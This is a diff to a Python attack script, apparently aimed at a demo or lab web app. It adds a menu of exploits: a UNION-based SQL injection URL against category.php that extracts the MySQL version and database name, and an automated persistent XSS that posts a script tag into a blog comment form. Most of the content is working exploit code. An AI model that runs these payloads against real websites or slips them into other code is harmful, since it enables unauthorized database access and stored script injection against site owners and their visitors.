@@ -2,6 +2,7 @@ import mechanize
 import requests
 from bs4 import BeautifulSoup
 from bs4 import Comment
+import sys
 
 browser = mechanize.Browser()
 browser.set_handle_robots(False)
@@ -43,23 +44,37 @@ try:
 
     #show possible hacks for the target
     if target==1:
-
-
-
+        print('Possible exploit for this target:')
+        print('1. SQL injection (retrieve MySQL version and DB name)')
+        print('2. Persistent XSS')
+        attack = input("Attack: ")
+        
         #make sure there is a slash at the end of the url
         if url[-1] != '/':
             url = url + '/'
+       
+        if attack == '1':
+            #get MySQL version and database name of the website
+            browser.open(url + "category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10;+--")
+            page = browser.response().read()
+            soupParser = BeautifulSoup(page, "html.parser")
 
-        #get MySQL version and database name of the website
-        browser.open(url + "category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10;+--")
-        page = browser.response().read()
-        soupParser = BeautifulSoup(page, "html.parser")
+            titles = soupParser.findAll("a", {"href": "post.php?post=1"})
+            print("MySQL version: " + titles[0].text)
 
-        titles = soupParser.findAll("a", {"href": "post.php?post=1"})
-        print("MySQL version: " + titles[0].text)
+            authors = soupParser.findAll("h3")
+            print("Database name: " + authors[0].a.text)
+        elif attack == '2':
+            browser.open(url + "post.php?post=1")
+            browser.select_form(nr=0)
 
-        authors = soupParser.findAll("h3")
-        print("Database name: " + authors[0].a.text)
+            browser.form['comment_author'] = '<script>alert(1)</script>'
+            browser.form['comment_email'] = 'hacker@gmail.com'
+            browser.form['comment_content'] = '<p>Hacker</p>'
+
+            req = browser.submit()
+        else:
+            print("Insert a valid attack number")
 
     if target==2:
         r = requests.get(url) #"http://localhost/codeigniter/index.php/xssdemo"
@@ -128,7 +143,8 @@ try:
         print("I cannot define the target")
 
 except:
-    print("Error! It could be the url")
+    e = sys.exc_info()[0]
+    print( "Error: %s" % e )
 
 #text = div.text
 #text = "".join([s for s in text.splitlines(True) if s.strip("\r\n")])
